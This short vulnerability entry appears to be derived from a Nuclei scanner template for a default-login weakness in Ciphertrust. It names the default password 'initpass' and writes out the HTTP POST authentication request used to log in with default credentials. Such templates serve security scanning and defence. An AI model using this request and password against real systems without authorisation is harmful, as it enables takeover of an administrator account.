# Vulnerability: Ciphertrust - Default Login
**Classification:** DEFAULT-LOGIN
**Source:** Nuclei Template (`ciphertrust-default-login.yaml`)

## Description
Attackers can control the entire platform through the default password （initpass） vulnerability, and use administrator privileges to operate core functions.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /api/v1/auth/tokens/  HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{"username":"{{username}}","connection":"local_account","password":"{{password}}","grant_type":"password","refresh_token_revoke_unused_in":30,"cookies":true,"labels":["web-ui"]}
```

